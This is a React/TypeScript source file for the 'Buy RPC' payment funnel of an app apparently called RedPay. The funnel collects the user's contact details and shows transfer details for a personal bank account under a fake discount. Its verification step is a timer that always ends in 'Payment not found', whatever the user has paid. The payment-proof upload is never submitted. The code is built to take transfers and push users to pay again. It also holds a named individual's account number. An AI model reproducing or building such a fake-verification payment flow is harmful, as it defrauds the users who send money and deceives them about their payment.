import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
import { AppShell, formatNaira } from "@/components/app-shell";
import { useQuery, useQueryClient } from "@tanstack/react-query";
import { useServerFn } from "@tanstack/react-start";
import { getMyProfile, logRpcIntake } from "@/lib/redpay.functions";
import { supabase } from "@/integrations/supabase/client";
import { useState, useEffect } from "react";
import { ArrowLeft, AlertTriangle, Copy, Loader2, ShieldCheck, X, CheckCircle2, Upload, Timer } from "lucide-react";
import { toast } from "sonner";

export const Route = createFileRoute("/_authenticated/rpc")({
  head: () => ({ meta: [{ title: "Buy RPC — RedPay" }] }),
  component: RpcFunnel,
});

type Step = "loading" | "intake" | "notice" | "pay" | "verify" | "failed";

type Payment = { bank: string; account_number: string; account_name: string; amount: number; original_amount?: number };
const DEFAULT_PAY: Payment = { bank: "Moniepoint MFB", account_number: "8130580949", account_name: "Philo Datuowei", amount: 6600, original_amount: 13000 };

function RpcFunnel() {
  const [step, setStep] = useState<Step>("loading");
  const fetchProfile = useServerFn(getMyProfile);
  const { data: profile } = useQuery({ queryKey: ["profile"], queryFn: () => fetchProfile() });
  const { data: pay = DEFAULT_PAY } = useQuery<Payment>({
    queryKey: ["rpc_payment"],
    queryFn: async () => {
      const { data } = await supabase.from("public_payment_settings").select("bank,account_name,account_number,amount,original_amount").eq("key", "rpc_payment").maybeSingle();
      return (data as Payment | null) ?? DEFAULT_PAY;
    },
  });
  const qc = useQueryClient();
  useEffect(() => {
    const ch = supabase.channel("rpc-payment-settings")
      .on("postgres_changes", { event: "*", schema: "public", table: "public_payment_settings" },
        () => qc.invalidateQueries({ queryKey: ["rpc_payment"] }))
      .subscribe();
    return () => { supabase.removeChannel(ch); };
  }, [qc]);

  return (
    <AppShell>
      <header className="p-4 flex items-center gap-3">
        <Link to="/dashboard"><ArrowLeft className="size-5" /></Link>
        <h1 className="text-lg font-bold">Buy RPC</h1>
      </header>

      {step === "loading" && <LoadingStep onDone={() => setStep("intake")} label="Preparing your RPC purchase…" />}
      {step === "intake" && <IntakeStep profile={profile} pay={pay} onDone={() => setStep("notice")} />}
      {step === "notice" && <NoticeStep onContinue={() => setStep("pay")} />}
      {step === "pay" && <PayStep pay={pay} onDone={() => setStep("verify")} profile={profile} />}
      {step === "verify" && <VerifyStep onDone={() => setStep("failed")} />}
      {step === "failed" && <FailedStep onRetry={() => setStep("pay")} />}
    </AppShell>
  );
}

function LoadingStep({ onDone, label }: { onDone: () => void; label: string }) {
  useEffect(() => { const t = setTimeout(onDone, 2000); return () => clearTimeout(t); }, [onDone]);
  return (
    <div className="p-4 pt-24 text-center animate-fade-in">
      <div className="mx-auto size-16 rounded-full border-4 border-primary/25 border-t-primary animate-spin" />
      <p className="mt-6 font-semibold">Processing…</p>
      <p className="text-sm text-muted-foreground mt-1">{label}</p>
    </div>
  );
}

function IntakeStep({ profile, pay, onDone }: { profile: any; pay: Payment; onDone: () => void }) {
  const [form, setForm] = useState({
    full_name: profile?.full_name ?? "",
    email: profile?.email ?? "",
    phone: profile?.phone ?? "",
  });
  const log = useServerFn(logRpcIntake);
  const [loading, setLoading] = useState(false);
  return (
    <form onSubmit={async e => {
      e.preventDefault(); setLoading(true);
      try { await log({ data: { email: form.email, phone: form.phone } }); onDone(); }
      finally { setLoading(false); }
    }} className="p-4 space-y-3 animate-fade-in">
      <div className="rounded-2xl bg-card border border-border p-4 text-sm space-y-1">
        <div className="flex justify-between items-center">
          <span className="text-muted-foreground">Amount</span>
          <span className="flex items-baseline gap-2">
            {pay.original_amount ? <span className="line-through text-xs text-muted-foreground">{formatNaira(pay.original_amount)}</span> : null}
            <span className="font-bold text-primary">{formatNaira(pay.amount)}</span>
          </span>
        </div>
        <div className="flex justify-between"><span className="text-muted-foreground">Referral code</span><span className="font-mono">{profile?.referral_code?.toUpperCase()}</span></div>
        <div className="flex justify-between"><span className="text-muted-foreground">User ID</span><span className="font-mono text-xs">{profile?.id?.slice(0, 8)}</span></div>
        <div className="mt-2 inline-flex items-center gap-1 rounded-full bg-primary/15 text-primary text-[10px] px-2 py-0.5">
          <Timer className="size-3" /> Promo price — free for only 2 months
        </div>
      </div>
      <F label="Full name"><input required value={form.full_name} onChange={e => setForm({ ...form, full_name: e.target.value })} className="input" /></F>
      <F label="Email"><input required type="email" value={form.email} onChange={e => setForm({ ...form, email: e.target.value })} className="input" /></F>
      <F label="Phone"><input required value={form.phone} onChange={e => setForm({ ...form, phone: e.target.value })} className="input" /></F>
      <button disabled={loading} className="w-full py-3 rounded-full gradient-red font-semibold text-primary-foreground shadow-glow disabled:opacity-60 inline-flex items-center justify-center gap-2">
        {loading && <Loader2 className="size-4 animate-spin" />} Continue
      </button>
      <StyleTag />
    </form>
  );
}

function NoticeStep({ onContinue }: { onContinue: () => void }) {
  return (
    <div className="p-4 animate-fade-in">
      <div className="rounded-3xl border border-yellow-500/30 bg-yellow-500/10 p-6">
        <div className="flex items-center gap-3">
          <div className="size-11 rounded-full bg-yellow-500/25 grid place-items-center"><AlertTriangle className="size-5 text-yellow-400" /></div>
          <h2 className="text-lg font-bold">⚠️ Important Payment Notice</h2>
        </div>
        <ul className="mt-4 space-y-3 text-sm">
          <li className="flex gap-2"><X className="size-4 text-primary shrink-0 mt-0.5" /> Do <strong>NOT</strong> pay from Opay bank — payment will not reflect.</li>
          <li className="flex gap-2"><CheckCircle2 className="size-4 text-success shrink-0 mt-0.5" /> Transfer the <strong>EXACT</strong> amount displayed.</li>
          <li className="flex gap-2"><CheckCircle2 className="size-4 text-success shrink-0 mt-0.5" /> Use only the account shown on the next screen.</li>
          <li className="flex gap-2"><CheckCircle2 className="size-4 text-success shrink-0 mt-0.5" /> Keep your receipt / proof of payment.</li>
        </ul>
        <button onClick={onContinue} className="mt-6 w-full py-3 rounded-full gradient-red font-semibold text-primary-foreground shadow-glow">I understand — Continue</button>
      </div>
    </div>
  );
}

function PayStep({ onDone, profile, pay }: { onDone: () => void; profile: any; pay: Payment }) {
  const [file, setFile] = useState<File | null>(null);
  return (
    <div className="p-4 space-y-3 animate-fade-in">
      <div className="rounded-3xl gradient-red text-white p-5 shadow-glow text-center">
        <p className="text-xs opacity-90">Total to pay</p>
        <p className="text-4xl font-black">{formatNaira(pay.amount)}</p>
        {pay.original_amount ? <p className="text-[11px] opacity-80 line-through">{formatNaira(pay.original_amount)}</p> : null}
      </div>
      <div className="rounded-2xl bg-card border border-border p-4">
        <p className="text-xs text-muted-foreground uppercase tracking-wider font-semibold mb-3">Transfer details</p>
        <Row label="Bank" value={pay.bank} />
        <Row label="Account number" value={pay.account_number} copyable />
        <Row label="Account name" value={pay.account_name} />
        <Row label="Amount" value={formatNaira(pay.amount)} copyable copyText={String(pay.amount)} />
        <Row label="Reference" value={`RPC-${profile?.username?.toUpperCase() ?? "USER"}`} copyable />
      </div>
      <div className="rounded-2xl bg-card border border-border p-4">
        <p className="text-xs text-muted-foreground font-semibold mb-2">Upload payment proof</p>
        <label className="flex items-center justify-center gap-2 border-2 border-dashed border-border rounded-xl py-6 cursor-pointer hover:bg-background/50">
          <Upload className="size-5 text-primary" />
          <span className="text-sm">{file ? file.name : "Tap to upload screenshot"}</span>
          <input type="file" accept="image/*" className="hidden" onChange={e => setFile(e.target.files?.[0] ?? null)} />
        </label>
      </div>
      <button onClick={onDone} className="w-full py-3 rounded-full gradient-red font-semibold text-primary-foreground shadow-glow">
        I have paid — Verify now
      </button>
      <p className="text-[11px] text-center text-muted-foreground">RPC is generated automatically after payment confirmation.</p>
    </div>
  );
}

function VerifyStep({ onDone }: { onDone: () => void }) {
  useEffect(() => { const t = setTimeout(onDone, 3500); return () => clearTimeout(t); }, [onDone]);
  return (
    <div className="p-4 pt-24 text-center animate-fade-in">
      <div className="mx-auto size-16 rounded-full border-4 border-primary/25 border-t-primary animate-spin" />
      <p className="mt-6 font-semibold">Verifying payment…</p>
      <p className="text-sm text-muted-foreground mt-1">Matching your transaction with our records</p>
    </div>
  );
}

function FailedStep({ onRetry }: { onRetry: () => void }) {
  return (
    <div className="p-4 animate-fade-in">
      <div className="rounded-3xl border border-primary/40 bg-card p-6 text-center shadow-glow">
        <div className="size-14 rounded-full bg-primary/15 grid place-items-center mx-auto"><AlertTriangle className="size-6 text-primary" /></div>
        <h2 className="mt-4 text-lg font-bold">Payment not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">We couldn't confirm your payment yet. If you already paid, please contact support with your receipt.</p>
        <div className="mt-5 space-y-2">
          <Link to="/support" className="w-full py-3 rounded-full gradient-red font-semibold text-primary-foreground inline-flex items-center justify-center gap-2">
            <ShieldCheck className="size-4" /> Chat with support
          </Link>
          <button onClick={onRetry} className="w-full py-2.5 rounded-full border border-border text-sm">Try again</button>
        </div>
      </div>
    </div>
  );
}

function Row({ label, value, copyable, copyText }: { label: string; value: string; copyable?: boolean; copyText?: string }) {
  return (
    <div className="flex items-center justify-between py-2 border-b border-border last:border-0">
      <span className="text-xs text-muted-foreground">{label}</span>
      <div className="flex items-center gap-2">
        <span className="font-semibold text-sm">{value}</span>
        {copyable && <button onClick={() => { navigator.clipboard.writeText(copyText ?? value); toast.success("Copied"); }}><Copy className="size-3.5 text-primary" /></button>}
      </div>
    </div>
  );
}

function F({ label, children }: { label: string; children: React.ReactNode }) {
  return <label className="block"><span className="text-xs font-medium text-muted-foreground">{label}</span><div className="mt-1">{children}</div></label>;
}
function StyleTag() {
  return <style>{`.input{width:100%;background:var(--color-input);border:1px solid var(--color-border);border-radius:0.7rem;padding:.7rem .85rem;font-size:.9rem;color:var(--color-foreground);outline:none} .input:focus{border-color:var(--color-ring)} .animate-fade-in{animation:fade .35s ease}@keyframes fade{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}`}</style>;
}
